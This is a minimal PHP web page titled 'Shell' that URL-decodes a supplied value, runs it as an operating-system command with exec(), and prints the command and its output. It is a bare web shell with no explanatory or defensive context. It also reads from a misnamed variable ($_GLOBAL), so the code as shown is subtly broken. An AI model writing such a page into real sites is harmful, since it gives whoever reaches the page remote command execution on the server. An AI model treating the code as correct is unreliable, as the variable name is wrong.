<!DOCTYPE html>
<html>
<head>
	<title>Shell</title>
	<meta charset="utf-8">
</head>
<body>
	<pre>
<?php
echo ">> " . rawurldecode($_GLOBAL["shell_command"]) . "\n";
exec(rawurldecode($_GLOBAL["shell_command"]), $output);
echo htmlentities(implode("\n", $output), ENT_SUBSTITUTE);
?>
	</pre>
</body>
</html>